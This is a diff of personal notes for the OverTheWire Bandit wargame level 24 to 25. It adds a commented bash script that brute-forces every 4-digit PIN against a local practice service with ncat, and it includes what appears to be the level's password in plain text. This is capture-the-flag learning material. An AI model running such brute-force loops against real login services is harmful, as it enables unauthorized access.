@@ -183,21 +183,46 @@ $ mkdir  /tmp/BandiT25
 $ chmod /tmp/BandiT25
 $ cd /tmp/BanditT25
 $ nano bandit25.sh
+
 #!/bin/bash
+# Use Bash to run this script.
 
-for char in  {0..9}{0..9}{0..9}{0..9}; do
+for char in {0..9}{0..9}{0..9}{0..9}; do
+# Try every possible 4-digit PIN: 0000 → 9999.
 
-echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $char" | ncat localhost 30002 |  egrep -v  "Exiting|Wrong|I am"
+    result=$(echo "TOKEN $char" | ncat localhost 30002 | egrep -vi "please|Wrong!|Try again| I am")
+    # Send the PIN to the server and remove the normal "wrong" messages.
+    # Save whatever is left in "result".
 
-# egrep → searches for text/patterns(allows for piping under quotes )
-#-v → reverses the search; hides matching lines.
-#"Exiting|Wrong|I am" → patterns to hide.
-#| → means OR.
+    if [[ -n "$result" ]]; then
+    # If "result" is NOT empty...
 
-echo "Wrong Pin: $char "
+        echo "Correct Pin: $char"
+        # Show the PIN that worked.
 
+        echo "$result"
+        # Show the server's response.
+
+        break
+        # Stop trying PINs.
+
+    fi
 done
-
+# Finish the loop.
 
 $ chmod +x bandit25.sh
 $ ./bandit25.sh
+
+#!/bin/bash
+
+for char in {0..9}{0..9}{0..9}{0..9}; do
+
+    result=$(echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $char" | ncat localhost 30002 | egrep -v "Exiting|Wrong|I am")
+
+    if [[ -n "$result" ]]; then
+        echo "Correct Pin: $char"
+        echo "$result"
+        break
+    fi
+
+done
